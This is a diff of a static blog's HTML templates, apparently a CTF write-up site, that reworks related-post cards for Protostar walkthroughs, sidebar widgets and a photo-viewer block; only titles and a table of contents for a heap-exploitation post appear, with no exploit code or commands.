+            <div class="article-image">
+                <img src="/p/protostar_format_0-4/cover.151cc4bdd51852f38533dab3b7c65c1c_hu26b9c4d780e35c305fc3142cfdfe9749_924530_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Format 0-4 Walkthrough"
+                        data-key="protostar_format_0-4" 
+                        data-hash="md5-FRzEvdUYUvOFM9qzt8ZcHA==">
+                
             </div>
         
 
-        
-    </footer>
-    
-
-    
-</div>
-</header>
-</article>
-        
-            
-<article class="has-image">
-    <header class="article-header">
-        <div class="article-image">
-            <a href="/p/protostar_stack_4-7/">
-                <img src="/p/protostar_stack_4-7/cover_hu89b69cad7273891b1af867ec9c4a2eb7_439381_800x0_resize_box_3.png"
-                        srcset="/p/protostar_stack_4-7/cover_hu89b69cad7273891b1af867ec9c4a2eb7_439381_800x0_resize_box_3.png 800w, /p/protostar_stack_4-7/cover_hu89b69cad7273891b1af867ec9c4a2eb7_439381_1600x0_resize_box_3.png 1600w"
-                        width="800" 
-                        height="258" 
-                        loading="lazy"
-                        alt="Featured image of post Protostar Stack 0-7 Walkthrough" />
-                
-            </a>
+        <div class="article-details">
+            <h2 class="article-title">Protostar Format 0-4 Walkthrough</h2>
         </div>
-    
-
-    <div class="article-details">
-    
-    <header class="article-category">
+    </a>
+</article>
+            
+                
+<article class="has-image">
+    <a href="/p/protostar_stack_4-7/">
         
-            <a href="/categories/binary/" style="background-color: #8ea885; color: #fff;">
-                Binary
-            </a>
         
-            <a href="/categories/stack/" style="background-color: #6b69d6; color: #fff;">
-                Stack
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/p/protostar_stack_4-7/">Protostar Stack 0-7 Walkthrough</a>
-        </h2>
-    
-        
-    </div>
-
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Mar 22, 2022</time>
+            <div class="article-image">
+                <img src="/p/protostar_stack_4-7/cover.cfd920525b2d933021345b98658bc9b7_hu89b69cad7273891b1af867ec9c4a2eb7_439381_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Protostar Stack 0-7 Walkthrough"
+                        data-key="protostar_stack_4-7" 
+                        data-hash="md5-z9kgUlstkzAhNFuYZYvJtw==">
+                
             </div>
         
 
-        
-    </footer>
-    
-
-    
-</div>
-</header>
+        <div class="article-details">
+            <h2 class="article-title">Protostar Stack 0-7 Walkthrough</h2>
+        </div>
+    </a>
 </article>
-        
-    </section>
-    <nav class='pagination'>
-        
-        
+            
+        </div>
+    </div>
+</aside>
 
+     
+    
         
-            
-                <span class='page-link current'>1</span>
-                
-            
-            
-                    <a class='page-link' href='/page/2/'>2</a>
-                
-            
-    </nav>
+    
 
-<footer class="site-footer">
+    <footer class="site-footer">
     
     
     <section class="powerby">
@@ -614,81 +1038,93 @@ if (!doNotTrack) {
     </section>
 </footer>
 
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
             </main>
     <aside class="sidebar right-sidebar sticky">
         
             
-                <form action="/search/" class="search-form widget" >
-        <p>
-            <label>搜索</label>
-            <input name="keyword" required placeholder="找点什么呢..." />
-        
-            <button title="搜索">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-            </button>
-        </p>
-    </form>
-            
-        
-            
-                <section class="widget archives">
+                
+    <section class="widget archives">
         <div class="widget-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
-</svg>
-
-
-
-        </div>
-        <h2 class="widget-title section-title">归档</h2>
-
-        
-        
-        
-        
-        
-        <div class="widget-archive--list">
-            <div class="archives-year">
-                    <a href="/archives/#2022">
-                        
-                            <span class="year">2022</span>
-                            <span class="count">5</span>
-                        
-                    </a> 
-                </div>
-            <div class="archives-year">
-                    <a href="/archives/#2021">
-                        
-                            <span class="year">2021</span>
-                            <span class="count">4</span>
-                        
-                    </a> 
-                </div>
-            <div class="archives-year">
-                    <a href="/archives/#1986">
-                        
-                            <span class="year">1986</span>
-                            <span class="count">1</span>
-                        
-                    </a> 
-                </div>
-            
-        </div>
-    </section>
-            
-        
-            
-                <section class="widget tagCloud">
-    <div class="widget-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
   <line x1="5" y1="9" x2="19" y2="9" />
   <line x1="5" y1="15" x2="19" y2="15" />
@@ -698,49 +1134,23 @@ if (!doNotTrack) {
 
 
 
-    </div>
-    <h2 class="widget-title section-title">分类</h2>
-
-    <div class="tagCloud-tags">
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
         
-            <a href="/categories/binary/" class="font_size_6">
-                Binary
-            </a>
-        
-            <a href="/categories/ruby/" class="font_size_3">
-                Ruby
-            </a>
-        
-            <a href="/categories/format/" class="font_size_2">
-                Format
-            </a>
-        
-            <a href="/categories/heap/" class="font_size_2">
-                Heap
-            </a>
-        
-            <a href="/categories/stack/" class="font_size_2">
-                Stack
-            </a>
-        
-            <a href="/categories/catchrubbish/" class="font_size_1">
-                CatchRubbish
-            </a>
-        
-            <a href="/categories/csharp/" class="font_size_1">
-                C#
-            </a>
-        
-            <a href="/categories/itunes/" class="font_size_1">
-                iTunes
-            </a>
-        
-            <a href="/categories/test/" class="font_size_1">
-                Test
-            </a>
-        
-    </div>
-</section>
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#final-two">Final Two</a></li>
+    <li><a href="#vulnerability">Vulnerability</a></li>
+    <li><a href="#restriction">Restriction</a></li>
+    <li><a href="#unlink">Unlink</a></li>
+    <li><a href="#fake-chunk">Fake chunk</a></li>
+    <li><a href="#expection">Expection</a></li>
+    <li><a href="#implement">Implement</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
 
             
         
